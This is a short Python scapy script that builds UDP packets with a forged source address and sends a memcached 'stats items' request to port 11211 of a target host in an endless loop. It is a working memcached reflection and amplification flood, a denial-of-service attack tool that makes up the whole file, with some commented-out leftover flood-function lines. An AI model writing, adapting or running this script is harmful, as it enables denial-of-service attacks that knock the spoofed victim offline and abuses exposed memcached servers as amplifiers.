import sys
from scapy.all import *

iface = "eth0"
target = "11.0.4.216";
spoofed_ip = "11.0.11.11";
port = 11211;
payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats items\r\n"
#def Flood(p1):
while 1:
    p1=IP(dst=target,src=spoofed_ip)/UDP(dport=port,sport=9443)/payload
    send(p1, loop=1)
    #ans,unans=srloop(p1, iface=iface, inter=0.03,retry=3, timeout=1)
    #ans.summary()
    #unans.summary()
#try:
 #   Flood(target, iface)
#except KeyboardInterrupt:
#    sys.exit(0)
